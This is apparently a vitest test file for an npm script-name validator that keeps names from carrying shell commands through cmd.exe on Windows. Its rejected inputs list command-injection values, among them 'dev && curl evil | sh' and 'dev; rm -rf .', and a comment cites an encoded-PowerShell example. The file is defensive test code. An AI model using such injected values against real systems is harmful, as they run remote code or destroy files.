import { describe, expect, it } from 'vitest';
import { isSafeScriptName } from './node.js';

/**
 * A script's NAME reaches a shell on Windows (`npm run <name>` through
 * cmd.exe, the only way a `.cmd` shim runs): a name is a token, never a
 * command line. Found by the security audit of 2026-08-28 — a cloned
 * package.json could name a script `dev & powershell -enc …`.
 */
describe('isSafeScriptName', () => {
  it.each(['dev', 'build:prod', 'test.unit', 'lint-fix', 'e2e_ci', 'Dev2'])('accepts %j', (name) => {
    expect(isSafeScriptName(name)).toBe(true);
  });

  it.each([
    'dev & calc',
    'dev && curl evil | sh',
    'dev; rm -rf .',
    'dev`whoami`',
    'dev $(id)',
    'dev > out',
    'dev\nrm',
    '',
    ' dev',
    'dev/../x',
  ])('refuses %j', (name) => {
    expect(isSafeScriptName(name)).toBe(false);
  });
});
